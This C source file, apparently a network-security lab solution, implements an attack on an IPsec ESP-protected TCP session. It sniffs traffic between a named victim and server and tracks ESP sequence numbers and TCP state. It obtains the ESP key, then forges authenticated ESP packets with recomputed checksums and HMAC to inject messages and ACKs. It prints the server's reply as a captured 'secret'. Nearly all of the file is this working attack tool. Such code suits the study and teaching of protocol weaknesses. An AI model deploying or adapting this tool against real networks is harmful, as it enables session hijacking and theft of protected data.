#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include "replay.h"
#include "dev.h"
#include "net.h"
#include "esp.h"
#include "hmac.h"
#include "transport.h"

struct frame_arr frame_buf;

void send_ack(Dev dev,
              Net net,
              Esp esp,
              Txp txp,
              uint8_t *last_sent_pkt)
{
    // assume no option for all headers
    struct iphdr last_ip_hdr = *(struct iphdr *)(last_sent_pkt + LINKHDRLEN);
    EspHeader last_esp_hdr = *(EspHeader *)(last_sent_pkt + LINKHDRLEN + sizeof(struct iphdr));
    struct tcphdr last_tcp_hdr = *(struct tcphdr *)(last_sent_pkt + LINKHDRLEN + sizeof(struct iphdr) + sizeof(EspHeader));

    last_tcp_hdr.seq = txp.thdr.ack_seq;
    last_tcp_hdr.ack_seq = htonl(htonl(txp.thdr.seq) + txp.plen);
    last_tcp_hdr.psh = 0;
    last_tcp_hdr.check = cal_tcp_cksm(last_ip_hdr, last_tcp_hdr, NULL, 0);
    memcpy(last_sent_pkt + 14 + 20 + 8, &last_tcp_hdr, sizeof(struct tcphdr)); // tcp header

    last_esp_hdr.seq = ntohl(ntohl(last_esp_hdr.seq) + 1);
    memcpy(last_sent_pkt + 14 + 20, &last_esp_hdr, 8); // esp header

    EspTrailer ack_trailer;
    ack_trailer.pad_len = 0x00;
    ack_trailer.nxt = 0x06;
    memcpy(last_sent_pkt + 14 + 20 + 8 + 20, &ack_trailer, 2); // esp trailer

    uint8_t buff[BUFSIZE];
    memcpy(buff, last_sent_pkt + 14 + 20, 30);
    hmac_sha1_96(esp.esp_key, 16, buff, 30, last_sent_pkt + 14 + 20 + 8 + 20 + 2); // padding

    last_ip_hdr.tot_len = ntohs(20 + 8 + 20 + 2 + 12);
    last_ip_hdr.id = ntohs(ntohs(last_ip_hdr.id) + 1);
    last_ip_hdr.check = cal_ipv4_cksm(last_ip_hdr);
    memcpy(last_sent_pkt + 14, &last_ip_hdr, 20); // ip header

    dev.framelen = LINKHDRLEN + sizeof(struct iphdr) + sizeof(EspHeader) + sizeof(struct tcphdr) + sizeof(EspTrailer) + 12;
    memcpy(dev.frame, last_sent_pkt, dev.framelen);
    dev.tx_frame(&dev);
    return;
}

void tx_esp_rep(Dev dev,
                Net net,
                Esp esp,
                Txp txp,
                uint8_t *data, ssize_t dlen, long msec)
{
    size_t nb = dlen;

    txp.plen = dlen;
    txp.fmt_rep(&txp, net.ip4hdr, data, nb);
    nb += sizeof(struct tcphdr);

    esp.plen = nb;
    esp.fmt_rep(&esp, TCP);
    esp.set_padpl(&esp);
    memcpy(esp.pl, &txp.thdr, txp.hdrlen);
    memcpy(esp.pl + txp.hdrlen, txp.pl, txp.plen);
    esp.set_auth(&esp, hmac_sha1_96);
    nb += sizeof(EspHeader) + sizeof(EspTrailer) +
          esp.tlr.pad_len + esp.authlen;

    net.plen = nb;

    net.fmt_rep(&net);
    memcpy(esp.pl - sizeof(EspHeader) - sizeof(struct iphdr), &net.ip4hdr, sizeof(struct iphdr));

    // dev.fmt_frame(&dev, net, esp, txp);
    dev.framelen = nb + sizeof(struct iphdr) + LINKHDRLEN;

    dev.tx_frame(&dev);
}

ssize_t send_msg(Dev *dev,
                 Net *net,
                 Esp *esp,
                 Txp *txp,
                 char *str)
{
    if (!dev || !net || !esp || !txp)
    {
        fprintf(stderr, "Invalid arguments of %s.\n", __func__);
        return -1;
    }

    ssize_t nb;
    uint8_t buf[BUFSIZE];

    if (str != NULL)
    {
        int i;
        for (i = 0; i < strlen(str); i++)
        {
            buf[i] = (uint8_t)str[i];
        }
        buf[i] = (uint8_t)'\r';
        buf[i + 1] = (uint8_t)'\n';
        nb = strlen(str) + 1;
    }
    else
    {
        nb = 0;
    }

    tx_esp_rep(*dev, *net, *esp, *txp, buf, nb, 0);

    return nb;
}

bool dissect_rx_data(Dev *dev,
                     Net *net,
                     Esp *esp,
                     Txp *txp,
                     int *state,
                     char *victim_ip,
                     char *server_ip,
                     bool *test_for_dissect)
{
    uint8_t *net_data = net->dissect(net, dev->frame + LINKHDRLEN, dev->framelen - LINKHDRLEN);

    if (net->pro == ESP)
    {
        uint8_t *esp_data = esp->dissect(esp, net_data, net->plen);

        uint8_t *txp_data = txp->dissect(net, txp, esp_data, esp->plen);

        if (txp->thdr.psh)
        {

            if (*test_for_dissect)
            {
                *test_for_dissect = false;
                puts("you can start to send the message...");
            }

            if (txp_data != NULL && txp->thdr.psh && *state == WAIT_SECRET &&
                strcmp(victim_ip, net->dst_ip) == 0 && strcmp(server_ip, net->src_ip) == 0)
            {
                puts("get secret: ");
                write(1, txp_data, txp->plen);
                puts("");
                *state = SEND_ACK;
            }
            return true;
        }
    }
    return false;
}

uint8_t *wait(Dev *dev,
              Net *net,
              Esp *esp,
              Txp *txp,
              int *state,
              char *victim_ip,
              char *server_ip,
              bool *test_for_dissect)
{
    bool dissect_finish;

    while (true)
    {
        dev->framelen = dev->rx_frame(dev);
        dissect_finish = dissect_rx_data(dev, net, esp, txp, state, victim_ip, server_ip, test_for_dissect) ? true : false;
        if (dissect_finish)
            break;
    }

    return dev->frame;
}

void record_txp(Net *net, Esp *esp, Txp *txp)
{
    extern EspHeader esp_hdr_rec;

    if (net->pro == ESP && strcmp(net->x_src_ip, net->src_ip) == 0)
    {
        esp_hdr_rec.spi = esp->hdr.spi;
        esp_hdr_rec.seq = ntohl(esp->hdr.seq);
    }

    if (strcmp(net->x_src_ip, net->src_ip) == 0)
    {
        txp->x_tx_seq = ntohl(txp->thdr.th_seq) + txp->plen;
        txp->x_tx_ack = ntohl(txp->thdr.th_ack);
        txp->x_src_port = ntohs(txp->thdr.th_sport);
        txp->x_dst_port = ntohs(txp->thdr.th_dport);
    }

    if (strcmp(net->x_src_ip, net->dst_ip) == 0)
    {
        txp->x_tx_seq = ntohl(txp->thdr.th_ack);
        txp->x_tx_ack = ntohl(txp->thdr.th_seq) + txp->plen;
        txp->x_src_port = ntohs(txp->thdr.th_dport);
        txp->x_dst_port = ntohs(txp->thdr.th_sport);
    }
}

void get_info(Dev *dev, Net *net, Esp *esp, Txp *txp, int *state, char *victim_ip, char *server_ip, bool *test_for_dissect)
{
    extern EspHeader esp_hdr_rec;

    wait(dev, net, esp, txp, state, victim_ip, server_ip, test_for_dissect);

    if (*state != SEND_ACK)
    {

        memcpy(dev->linkhdr, dev->frame, LINKHDRLEN);

        strcpy(net->x_src_ip, net->src_ip);
        strcpy(net->x_dst_ip, net->dst_ip);

        txp->x_src_port = ntohs(txp->thdr.th_sport);
        txp->x_dst_port = ntohs(txp->thdr.th_dport);

        record_txp(net, esp, txp);
        esp_hdr_rec.spi = esp->hdr.spi;
        esp->get_key(esp);
    }
}
